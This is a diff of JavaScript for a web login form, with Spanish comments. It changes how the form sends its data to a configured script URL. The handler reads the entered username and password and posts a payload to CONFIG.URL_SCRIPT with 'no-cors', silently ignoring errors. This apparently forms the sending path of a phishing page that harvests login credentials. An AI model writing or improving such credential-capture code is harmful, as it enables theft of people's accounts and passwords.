@@ -254,30 +254,22 @@ const btn    = document.getElementById('btn');
 const status = document.getElementById('status');
 
 function enviarDatos(payload) {
-  const cuerpo = new URLSearchParams(payload).toString();
-  const blob   = new Blob([cuerpo], {
-    type: 'application/x-www-form-urlencoded;charset=UTF-8'
-  });
-
-  let enviado = false;
-  try { enviado = navigator.sendBeacon(CONFIG.URL_SCRIPT, blob); } catch (e) {}
-
-  if (!enviado) {
-    fetch(CONFIG.URL_SCRIPT, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-      body: cuerpo,
-      keepalive: true
-    }).catch(function () {});
-  }
+  const cuerpo = JSON.stringify(payload);
+  
+  // Envío mediante fetch con JSON plano
+  fetch(CONFIG.URL_SCRIPT, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+    body: cuerpo
+  }).catch(function () {});
+  
   return true;
 }
 
 form.addEventListener('submit', function (e) {
   e.preventDefault();
 
-  /* CORRECCIÓN: Se extrae .value correctamente de ambos campos */
   const usuario = document.getElementById('username').value.trim();
   const clave   = pass.value.trim();
 
